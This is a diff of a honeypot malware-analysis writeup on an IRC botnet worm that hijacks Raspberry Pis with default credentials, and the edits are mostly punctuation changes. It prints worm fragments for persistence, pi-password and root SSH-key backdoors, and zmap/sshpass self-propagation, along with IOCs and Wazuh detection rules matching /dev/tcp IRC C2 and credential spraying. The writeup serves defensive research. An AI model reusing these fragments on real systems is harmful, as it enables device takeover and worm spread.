@@ -1,16 +1,16 @@
-# IRC Botnet Worm — Full Source Capture & Analysis
+# IRC Botnet Worm: Full Source Capture & Analysis
 
 **Document ID:** NINGI-WRITEUP-005
 **Date:** 2026-03-13
-**Category:** Malware Analysis — Complete Source Capture
-**Environment:** fuji-mailbox VPS — Cowrie 2.x / Wazuh 4.14.0
+**Category:** Malware Analysis: Complete Source Capture
+**Environment:** fuji-mailbox VPS: Cowrie 2.x / Wazuh 4.14.0
 **Severity:** Critical
 
 ---
 
 ## Overview
 
-Two attackers (`141.164.144.181` on 2026-03-02 and `64.92.6.70` on 2026-03-04) uploaded complete copies of a self-replicating IRC botnet worm to the Cowrie honeypot via stdin, and I captured the full source intact. The script is a sophisticated bash worm that establishes IRC-based C2 with RSA-signed commands, propagates autonomously via `zmap` and `sshpass`, kills competing malware, hijacks the `pi` user account, and installs boot persistence, all targeting Raspberry Pi devices running default credentials.
+Two attackers (`141.164.144.181` on 2026-03-02 and `64.92.6.70` on 2026-03-04) uploaded complete copies of a self-replicating IRC botnet worm to the Cowrie honeypot via stdin, and I captured the full source intact. The script is an advanced bash worm that sets up IRC based C2 with RSA signed commands, spreads by itself using `zmap` and `sshpass`, kills competing malware, hijacks the `pi` user account, and installs boot persistence. It targets Raspberry Pi devices still using default credentials.
 
 This is the most complete malware artefact I captured in the honeypot during this period. Both uploads are byte-different copies of the same script, with only the random seed in the Cowrie header changing, which confirms two independent campaign nodes operating the same tooling.
 
@@ -57,7 +57,7 @@ Attacker logs in → uploads script via stdin
 
 ## Stage-by-Stage Analysis
 
-### Stage 1 — Boot Persistence
+### Stage 1: Boot Persistence
 
 ```bash
 if [ "$EUID" -ne 0 ]; then
@@ -73,11 +73,11 @@ fi
 
 If running without root, the script escalates via `sudo`, copies itself to `/opt/` under a random 8-character name, overwrites `/etc/rc.local` to execute on every boot, then forces a reboot. After reboot it runs as root automatically and proceeds to the payload stages. The random filename makes the persisted copy harder to find by name.
 
-**MITRE ATT&CK:** T1037.004 — Boot or Logon Initialization Scripts: RC Scripts
+**MITRE ATT&CK:** T1037.004: Boot or Logon Initialization Scripts: RC Scripts
 
 ---
 
-### Stage 2 — Kill Competing Malware
+### Stage 2: Kill Competing Malware
 
 ```bash
 killall bins.sh minerd node nodejs
@@ -97,35 +97,35 @@ Before installing itself, the worm terminates a specific list of competing malwa
 | `perl` | Perl-based IRC bots (eggdrop variants) |
 | `node`/`nodejs` | JS-based miners and bots |
 
-This is deliberate turf war behaviour — the worm is designed to evict other malware families and take sole control of the host before establishing persistence.
+This is deliberate turf war behaviour: the worm is designed to evict other malware families and take sole control of the host before establishing persistence.
 
-**MITRE ATT&CK:** T1562 — Impair Defenses
+**MITRE ATT&CK:** T1562: Impair Defenses
 
 ---
 
-### Stage 3 — Block Competitor C2 Domain
+### Stage 3: Block Competitor C2 Domain
 
 ```bash
 echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
 ```
 
-Blackholes a specific competitor C2 domain by redirecting it to localhost. This prevents previously installed `bins.sh` campaign malware from receiving commands or re-infecting the host. The domain `bins.deutschland-zahlung.eu` is a known Mirai-era botnet C2 — the worm author is aware of it specifically and eliminates it as competition.
+Blackholes a specific competitor C2 domain by redirecting it to localhost. This prevents previously installed `bins.sh` campaign malware from receiving commands or re-infecting the host. The domain `bins.deutschland-zahlung.eu` is a known Mirai-era botnet C2: the worm author is aware of it specifically and eliminates it as competition.
 
 ---
 
-### Stage 4 — Account Takeover
+### Stage 4: Account Takeover
 
 ```bash
 usermod -p '$6$vGkGPKUr$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1' pi
 ```
 
-Replaces the `pi` user's password with a hardcoded SHA-512 hash, overwriting the default `raspberry` password. The same hash appears in both script variants — a shared credential used across the entire campaign. Any Raspberry Pi running this worm has its `pi` account silently hijacked.
+Replaces the `pi` user's password with a hardcoded SHA-512 hash, overwriting the default `raspberry` password. The same hash appears in both script variants: a shared credential used across the entire campaign. Any Raspberry Pi running this worm has its `pi` account silently hijacked.
 
-**MITRE ATT&CK:** T1098 — Account Manipulation
+**MITRE ATT&CK:** T1098: Account Manipulation
 
 ---
 
-### Stage 5 — SSH Backdoor Key Injection
+### Stage 5: SSH Backdoor Key Injection
 
 ```bash
 mkdir -p /root/.ssh
@@ -134,11 +134,11 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN..." >> /root/.ssh/authorized_
 
 Injects a hardcoded RSA public key into `/root/.ssh/authorized_keys`. This is a distinct key from the `mdrfckr` key documented in WRITEUP-004, confirming a separate campaign. Any host infected by this worm is permanently backdoored for the operator's SSH access.
 
-**MITRE ATT&CK:** T1098.004 — Account Manipulation: SSH Authorized Keys
+**MITRE ATT&CK:** T1098.004: Account Manipulation: SSH Authorized Keys
 
 ---
 
-### Stage 6 — Clean Up Prior Infections
+### Stage 6: Clean Up Prior Infections
 
 ```bash
 rm -rf /tmp/ktx*
@@ -150,7 +150,7 @@ Removes known artefacts of competing malware from temp directories, further cons
 
 ---
 
-### Stage 7 — IRC C2 Bot with RSA-Signed Commands
+### Stage 7: IRC C2 Bot with RSA-Signed Commands
 
 The worm writes an RSA public key to `/tmp/public.pem`, then drops and executes a full IRC bot as a background process:
 
@@ -163,9 +163,9 @@ The worm writes an RSA public key to `/tmp/public.pem`, then drops and executes 
 | Channel | `#biret` |
 | Nick format | `a` + last 8 chars of `uname -a \| md5sum` |
 
-The nick generation is deterministic per host — `uname -a` is stable on a given machine, so the operator gets a consistent, unique identifier for each compromised node.
+The nick generation is deterministic per host: `uname -a` is stable on a given machine, so the operator gets a consistent, unique identifier for each compromised node.
 
-**RSA-signed command execution — the key security mechanism:**
+**RSA-signed command execution: the key security mechanism:**
 
 ```bash
 hash=`echo $privmsg_data | base64 -d | md5sum | awk -F' ' '{print $1}'`
@@ -188,13 +188,13 @@ sleep 3
 rm -rf /tmp/$BOT
 ```
 
-The process runs in memory via `nohup`, leaving no script file on disk — only a `bot.log` file and the running process.
+The process runs in memory via `nohup`, leaving no script file on disk: only a `bot.log` file and the running process.
 
-**MITRE ATT&CK:** T1071.003 — Application Layer Protocol: IRC C2
+**MITRE ATT&CK:** T1071.003: Application Layer Protocol: IRC C2
 
 ---
 
-### Stage 8 — Autonomous Propagation via zmap
+### Stage 8: Autonomous Propagation via zmap
 
 ```bash
 apt-get install zmap sshpass -y --force-yes
@@ -215,23 +215,23 @@ done
 
 The propagation loop runs indefinitely:
 
-1. `zmap -p 22 -n 100000` — scans 100,000 random internet IPs for open SSH port 22
+1. `zmap -p 22 -n 100000`: scans 100,000 random internet IPs for open SSH port 22
 2. For each responding IP, attempts SCP to copy itself as `pi@IP:/tmp/<random>`
 3. If SCP succeeds, SSHes in and executes the copy
 4. Tries two Raspberry Pi default passwords: `raspberry` and `raspberry993311` (a common variant)
 5. Sleeps 10 seconds, repeats
 
-Each infected host becomes a new propagation node, scanning for and infecting further targets. This is a classic worm propagation model — exponential spread across internet-facing Raspberry Pi devices with default credentials.
+Each infected host becomes a new spread node, scanning for and infecting more targets. This is a classic worm model: fast spread across Raspberry Pi devices exposed to the internet with default credentials.
 
-**The `bins.deutschland-zahlung.eu` blackhole from Stage 3 makes sense here** — that domain belongs to a competing worm using the same `raspberry` credential vector. The author is specifically eliminating the competition on each newly infected host.
+**The `bins.deutschland-zahlung.eu` blackhole from Stage 3 makes sense here**: that domain belongs to a competing worm using the same `raspberry` credential vector. The author is specifically eliminating the competition on each newly infected host.
 
-**MITRE ATT&CK:** T1210 — Exploitation of Remote Services (SSH credential spray), T1570 — Lateral Tool Transfer
+**MITRE ATT&CK:** T1210: Exploitation of Remote Services (SSH credential spray), T1570: Lateral Tool Transfer
 
 ---
 
-## The 94f2e4d8 Binary — SSH Server Replacement
+## The 94f2e4d8 Binary: SSH Server Replacement
 
-The binary uploaded by five separate IPs including `142.93.220.184` (the sshd masquerader from WRITEUP-002) reveals itself via strings analysis as a **Go-based SSH server replacement** compiled with CGo PAM support:
+The binary uploaded by five separate IPs including `142.93.220.184` (the sshd masquerader from WRITEUP-002) identifies itself through strings analysis as a **Go SSH server replacement** compiled with CGo PAM support:
 
 ```
 libpam.so.0
@@ -242,17 +242,17 @@ crosscall_amd64
 ```
 
 Key indicators:
-- Full PAM authentication stack (pam_open_session, pam_acct_mgmt, pam_chauthtok) — this binary handles SSH authentication itself
-- `mygetpwnam_r` — custom password lookup, likely logs credentials
-- `getaddrinfo` / `getnameinfo` — DNS resolution for C2 callback
-- `BuildID[sha1]=300bf5c7e304c732122f0b0fa290bda984441bd6` — unique build, not stripped of build ID unlike the other binaries
+- Full PAM authentication stack (pam_open_session, pam_acct_mgmt, pam_chauthtok): this binary handles SSH authentication itself
+- `mygetpwnam_r`: custom password lookup, likely logs credentials
+- `getaddrinfo` / `getnameinfo`: DNS resolution for C2 callback
+- `BuildID[sha1]=300bf5c7e304c732122f0b0fa290bda984441bd6`: unique build, not stripped of build ID unlike the other binaries
 - Compiled for GNU/Linux 3.2.0+ (broad compatibility)
 
-**Assessment:** This is a credential-harvesting fake SSH server. When placed as the system `sshd` (as `142.93.220.184` did with their `nohup ./<random>/sshd &` pattern from WRITEUP-002), it accepts legitimate SSH connections, logs all credentials entered, and forwards them to the operator — while appearing as a normal `sshd` process.
+**Assessment:** This is a credential-harvesting fake SSH server. When placed as the system `sshd` (as `142.93.220.184` did with their `nohup ./<random>/sshd &` pattern from WRITEUP-002), it accepts legitimate SSH connections, logs all credentials entered, and forwards them to the operator: while appearing as a normal `sshd` process.
 
 The `TegskTGfBzL5ZXVeATJZ/Kg4gGwZNHviZINPIVp6K/-aw3x4amOW3feyTomlq7/WXkOJPhAhVPtgkpGtlhH` string near the top of the binary is likely an encrypted C2 address or embedded API key.
 
-**MITRE ATT&CK:** T1036.005 — Masquerade: Match Legitimate Name, T1557 — Adversary-in-the-Middle (credential capture)
+**MITRE ATT&CK:** T1036.005: Masquerade: Match Legitimate Name, T1557: Adversary-in-the-Middle (credential capture)
 
 ---
 
@@ -261,13 +261,13 @@ The `TegskTGfBzL5ZXVeATJZ/Kg4gGwZNHviZINPIVp6K/-aw3x4amOW3feyTomlq7/WXkOJPhAhVPt
 | SHA-256 (first 16) | Type | Source IPs | Assessment |
 |---|---|---|---|
 | `87962f5746b0bdaf` | Shell script | `185.242.3.105` | Mirai multi-arch dropper (sshbins.sh) |
-| `b4c8f6e4e5ca7f71` | Bash worm | `141.164.144.181` | IRC botnet worm — full source |
-| `595a0565461528e3` | Bash worm | `64.92.6.70` | IRC botnet worm — variant copy |
+| `b4c8f6e4e5ca7f71` | Bash worm | `141.164.144.181` | IRC botnet worm: full source |
+| `595a0565461528e3` | Bash worm | `64.92.6.70` | IRC botnet worm: variant copy |
 | `a8460f446be54041` | SSH public key | 7 IPs | mdrfckr Mirai backdoor key |
 | `94f2e4d8d4436874` | ELF 64-bit Go | 5 IPs incl. `142.93.220.184` | Fake SSH server / credential harvester |
 | `eae72481b8234878` | ELF 32-bit static | `103.59.160.195` | IoT/Mirai binary (Linux 2.6.9 target) |
 | `60496d5648c20f14` | ELF 32-bit static | Older volume | IoT/Mirai binary (Linux 2.6.9 target) |
-| `e3b0c44298fc1c14` | Empty file | `123.234.3.106`, `182.40.104.74` | SHA-256 of empty — failed upload |
+| `e3b0c44298fc1c14` | Empty file | `123.234.3.106`, `182.40.104.74` | SHA-256 of empty: failed upload |
 | Multiple others | ELF 64-bit packed | Various | Packed binaries, missing section headers |
 
 ---
@@ -276,8 +276,8 @@ The `TegskTGfBzL5ZXVeATJZ/Kg4gGwZNHviZINPIVp6K/-aw3x4amOW3feyTomlq7/WXkOJPhAhVPt
 
 | Type | Value |
 |---|---|
-| IP | `141.164.144.181` — worm upload |
-| IP | `64.92.6.70` — worm upload |
+| IP | `141.164.144.181`: worm upload |
+| IP | `64.92.6.70`: worm upload |
 | SHA-256 | `b4c8f6e4e5ca7f71f5b94470d34880aa66d25bf88bbf405a0365ba3ef15db829` |
 | SHA-256 | `595a0565461528e335b8a4c3e93f305bec04089c04a641c233e28a26ffca40d6` |
 | IRC network | Undernet, port 6667 |
@@ -317,16 +317,16 @@ grep pi /etc/shadow
   <if_sid>100100</if_sid>
   <field name="eventid">cowrie.command.input</field>
   <match>/dev/tcp.*6667\|undernet\.org</match>
-  <description>Cowrie: IRC C2 connection via /dev/tcp — IRC botnet</description>
+  <description>Cowrie: IRC C2 connection via /dev/tcp: IRC botnet</description>
   <group>cowrie,c2,irc_bot,</group>
 </rule>
 
-<!-- Competitor malware kill list — indicates turf war worm -->
+<!-- Competitor malware kill list: indicates turf war worm -->
 <rule id="100114" level="13">
   <if_sid>100100</if_sid>
   <field name="eventid">cowrie.command.input</field>
   <match>killall kaiten\|killall minerd\|killall ktx-</match>
-  <description>Cowrie: Competitor malware kill — self-propagating worm activity</description>
+  <description>Cowrie: Competitor malware kill: self-propagating worm activity</description>
   <group>cowrie,malware,worm,</group>
 </rule>
 
@@ -335,7 +335,7 @@ grep pi /etc/shadow
   <if_sid>100100</if_sid>
   <field name="eventid">cowrie.command.input</field>
   <match>zmap -p 22\|sshpass -praspberry</match>
-  <description>Cowrie: SSH worm propagation — zmap scan + sshpass spray</description>
+  <description>Cowrie: SSH worm propagation: zmap scan + sshpass spray</description>
   <group>cowrie,malware,worm,propagation,</group>
 </rule>
 
@@ -369,13 +369,13 @@ grep pi /etc/shadow
 
 ## Lessons Learned
 
-- **Cowrie stdin capture is high-value.** Both worm copies were uploaded interactively via stdin — Cowrie captured the complete source without any special configuration. Any attacker who types or pipes a script into an SSH session has it recorded.
+- **Cowrie stdin capture is high value.** Both worm copies were uploaded interactively via stdin: Cowrie captured the complete source without any special configuration. Any attacker who types or pipes a script into an SSH session has it recorded.
 - **The `file` command is not definitive.** Both scripts were misidentified as raw `data` due to the Cowrie header prefix. `xxd` and `strings` revealed the true content. Always use multiple analysis methods.
-- **RSA-signed IRC C2 is not new but remains effective.** The use of `openssl rsautl` for command verification is a well-known technique that prevents botnet hijacking — a defender joining `#biret` cannot issue commands without the private key.
-- **Malware ecosystems compete.** The explicit blackholing of `bins.deutschland-zahlung.eu` and the `killall` competitor list demonstrates active awareness of competing campaigns. Internet-facing honeypots attract multiple simultaneous campaigns that actively interfere with each other.
+- **RSA-signed IRC C2 is not new but remains effective.** The use of `openssl rsautl` for command verification is a well-known technique that prevents botnet hijacking: a defender joining `#biret` cannot issue commands without the private key.
+- **Malware crews compete.** The explicit blackholing of `bins.deutschland-zahlung.eu` and the `killall` rival list shows active awareness of other campaigns. Honeypots exposed to the internet attract multiple campaigns that interfere with each other.
 - **Raspberry Pi default credentials remain a live threat.** Both passwords targeted (`raspberry`, `raspberry993311`) are default or near-default Pi credentials. Any Raspberry Pi exposed to the internet with default credentials will be compromised and enlisted in this worm within hours.
 
 ---
 
-*Everything in this writeup came from real attack traffic captured by my Cowrie honeypot between 2026-03-02 and 2026-03-13.*  
+*Everything in this writeup came from real attack traffic captured by my Cowrie honeypot between 2026-03-02 and 2026-03-13.*
 *I documented it as part of the homelab research project.*
